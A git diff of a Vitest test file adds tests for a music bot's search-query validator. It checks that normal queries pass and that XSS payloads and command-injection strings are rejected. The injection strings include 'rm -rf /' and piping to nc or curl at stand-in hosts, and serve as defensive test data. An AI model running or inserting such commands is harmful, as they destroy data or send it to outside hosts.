@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest';
-import { validateCommandMessage } from '../src/validation.js';
+import { validateCommandMessage, validateSearchQuery } from '../src/validation.js';
 
 describe('Audio Command Validation', () => {
   describe('validateCommandMessage', () => {
@@ -296,17 +296,234 @@ describe('Audio Command Validation', () => {
         voiceChannelId: '987654321098765432',
         textChannelId: '111222333444555666', 
         userId: '777888999000111222',
-        query: 'Song Title with "quotes" and \'apostrophes\' <removed>'
+        query: 'Song Title with "quotes" and \'apostrophes\' <div>removed</div>'
       };
 
       const result = validateCommandMessage(command);
       
       expect(result.success).toBe(true);
-      expect(result.data?.query).not.toContain('<');
-      expect(result.data?.query).not.toContain('>');
-      expect(result.data?.query).not.toContain('"');
-      expect(result.data?.query).not.toContain("'");
+      expect(result.data?.query).not.toContain('<div>');
+      expect(result.data?.query).not.toContain('</div>');
       expect(result.data?.query).toContain('Song Title');
+      expect(result.data?.query).toContain('"quotes"');
+      expect(result.data?.query).toContain("'apostrophes'");
+    });
+  });
+
+  describe('validateSearchQuery', () => {
+    it('should validate normal search queries', () => {
+      const validQueries = [
+        'Taylor Swift - Anti-Hero',
+        'The Beatles - Yesterday',
+        'Mozart Symphony No. 40',
+        'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+        'Beethoven 9th Symphony',
+        'Song with émojis 🎵 and ñ characters',
+        'Artist feat. Other Artist',
+        'Song (Official Video) [HD]',
+        'Nightcore - Song Name',
+        '2023 Hit Songs Playlist'
+      ];
+
+      for (const query of validQueries) {
+        const result = validateSearchQuery(query);
+        expect(result.success).toBe(true);
+        expect(result.data).toBeDefined();
+        expect(result.data?.length).toBeGreaterThan(0);
+      }
+    });
+
+    it('should reject empty or whitespace-only queries', () => {
+      const emptyQueries = [
+        '',
+        '   ',
+        '\t\n\r   ',
+        '\u00A0', // non-breaking space
+      ];
+
+      for (const query of emptyQueries) {
+        const result = validateSearchQuery(query);
+        expect(result.success).toBe(false);
+        expect(result.error).toMatch(/empty/i);
+      }
+    });
+
+    it('should reject queries that are too long', () => {
+      const longQuery = 'a'.repeat(1001);
+      const result = validateSearchQuery(longQuery);
+      expect(result.success).toBe(false);
+      expect(result.error).toMatch(/too long/i);
+    });
+
+    it('should detect and reject XSS attempts', () => {
+      const xssAttempts = [
+        '<script>alert("xss")</script>',
+        '<script src="malicious.js"></script>',
+        '<iframe src="javascript:alert(1)"></iframe>',
+        '<object data="javascript:alert(1)"></object>',
+        '<embed src="javascript:alert(1)">',
+        'javascript:alert(1)',
+        'vbscript:msgbox(1)',
+        'data:text/html,<script>alert(1)</script>',
+        'onload=alert(1)',
+        'onclick=alert(1)',
+        'onerror=alert(1)'
+      ];
+
+      for (const query of xssAttempts) {
+        const result = validateSearchQuery(query);
+        expect(result.success).toBe(false);
+        expect(result.error).toMatch(/malicious content/i);
+      }
+    });
+
+    it('should detect and reject obvious command injection attempts', () => {
+      const injectionAttempts = [
+        'song; rm -rf /',
+        'song | nc evil.com 1337',
+        'song | curl malicious.com',
+        '; shutdown -h now',
+        '| bash -c "evil"'
+      ];
+
+      for (const query of injectionAttempts) {
+        const result = validateSearchQuery(query);
+        expect(result.success).toBe(false);
+        expect(result.error).toMatch(/malicious content/i);
+      }
+    });
+
+    it('should allow harmless characters that might look suspicious', () => {
+      const acceptableQueries = [
+        'song && artist', // && in music context
+        'song; artist', // ; as separator in music
+        'song | artist', // | as separator in music
+        'song (feat. artist)',
+        'song [official video]',
+        'song {remastered}',
+        'song $uicideboy$', // artist name
+        "song 'acoustic version'",
+        'song eval(uation)',
+        'song with exec(utive) producer'
+      ];
+
+      for (const query of acceptableQueries) {
+        const result = validateSearchQuery(query);
+        expect(result.success).toBe(true);
+      }
+    });
+
+    it('should allow common SQL-like terms in music context', () => {
+      const musicQueriesWithSQLTerms = [
+        "song UNION band",
+        'song DROP artist',
+        "song DELETE record",
+        'song OR artist',
+        'song INSERT coin',
+        'song SELECT edition'
+      ];
+
+      for (const query of musicQueriesWithSQLTerms) {
+        const result = validateSearchQuery(query);
+        expect(result.success).toBe(true); // Should be allowed in music context
+      }
+    });
+
+    it('should allow normal file paths and URLs but reject dangerous protocols', () => {
+      const acceptableUrls = [
+        'https://youtube.com/watch?v=abc123',
+        'https://open.spotify.com/track/123',
+        'song/artist/album',
+        '../previous album',
+        '~/home/music/song.mp3'
+      ];
+
+      for (const query of acceptableUrls) {
+        const result = validateSearchQuery(query);
+        expect(result.success).toBe(true);
+      }
+    });
+
+    it('should properly sanitize queries with HTML tags', () => {
+      const result = validateSearchQuery('Song with <script>alert("test")</script> tags');
+      
+      expect(result.success).toBe(false); // Should be rejected due to script tag
+    });
+
+    it('should preserve most punctuation in music context', () => {
+      const result = validateSearchQuery('Song with & "quotes" and \'apostrophes\' {braces}');
+      
+      expect(result.success).toBe(true);
+      expect(result.data).toContain('Song with');
+      // These characters should be preserved for music searches
+      expect(result.data).toContain('&');
+      expect(result.data).toContain('"');
+      expect(result.data).toContain("'");
+      expect(result.data).toContain('{');
+      expect(result.data).toContain('}');
+    });
+
+    it('should remove control characters and normalize whitespace', () => {
+      // Use control chars that aren't null bytes (which are correctly rejected as malicious)
+      const queryWithControlChars = 'Song\x08With\x0BControl\x0CChars   and   extra   spaces';
+      const result = validateSearchQuery(queryWithControlChars);
+      
+      expect(result.success).toBe(true);
+      expect(result.data).toBe('SongWithControlChars and extra spaces');
+      expect(result.data).not.toMatch(/[\x00-\x1F]/);
+      expect(result.data).not.toMatch(/\s{2,}/);
+    });
+
+    it('should handle edge cases with special Unicode characters', () => {
+      const unicodeQuery = 'Song with émojis 🎵🎶 and other unicode ñáéíóú';
+      const result = validateSearchQuery(unicodeQuery);
+      
+      expect(result.success).toBe(true);
+      expect(result.data).toContain('émojis');
+      expect(result.data).toContain('🎵🎶');
+      expect(result.data).toContain('ñáéíóú');
+    });
+
+    it('should reject queries that become empty after sanitization', () => {
+      const queriesThatBecomeEmpty = [
+        '<script></script>',
+        '\x00\x01\x02'  // only control characters
+      ];
+
+      for (const query of queriesThatBecomeEmpty) {
+        const result = validateSearchQuery(query);
+        expect(result.success).toBe(false);
+        // Should be rejected either as malicious or empty after sanitization
+        expect(result.error).toMatch(/(malicious content|empty after sanitization)/i);
+      }
+    });
+
+    it('should enforce length limit after sanitization', () => {
+      // Create a string that when sanitized might still be too long
+      const longQueryWithHtml = '<div>' + 'a'.repeat(1500) + '</div>';
+      const result = validateSearchQuery(longQueryWithHtml);
+      
+      if (result.success) {
+        expect(result.data?.length).toBeLessThanOrEqual(1000);
+      }
+    });
+
+    it('should handle non-string inputs gracefully', () => {
+      const invalidInputs = [
+        null,
+        undefined,
+        123,
+        [],
+        {},
+        true,
+        false
+      ];
+
+      for (const input of invalidInputs) {
+        const result = validateSearchQuery(input as unknown as string);
+        expect(result.success).toBe(false);
+        expect(result.error).toMatch(/non-empty string/i);
+      }
     });
   });
 });
